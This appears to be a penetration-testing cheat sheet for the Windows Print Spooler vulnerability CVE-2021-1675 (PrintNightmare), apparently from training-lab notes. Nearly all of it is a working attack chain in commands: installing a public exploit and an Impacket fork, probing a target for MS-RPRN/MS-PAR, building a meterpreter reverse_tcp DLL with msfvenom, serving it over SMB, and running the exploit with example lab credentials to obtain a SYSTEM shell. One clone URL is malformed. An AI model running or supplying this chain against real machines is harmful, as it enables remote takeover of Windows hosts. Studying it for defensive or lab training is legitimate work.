-- -
Vulnerability in the Print Spooler Service that runs on all Windows Operating Systems. 
#### Requirements
```bash
# Clone cube0x0's exploit, note there are many others
git clone https://github.comcube0x0/CVE-2021-1675.git

# Install cube0x0's version of Impacket
# The exploit requires a very specific version of impacket, so you may need to uninstall your version and install his, unless you use venvs like you usually do.
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```
#### Check for Vulnerability
```bash
# check if required 2 services are exposed
rpcdump.py @<ip> | egrep "MS-RPRN|MS-PAR"
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
#### Exploit
```bash
# Create payload, which is a DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attack ip> LPORT=8080 -f dll > backupscript.dll

# Create share on attackbox that will host malicious DLL
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Start multi handler in msfconsole
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <attack ip>
set lport 8080
run

# Run the exploit
sudo python3 CVE-2021-1675.py <domain>/<user>:<passwd>@<target ip> '\\<attack ip>\CompData\backupscript.dll'

sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

# Should have a system shell
```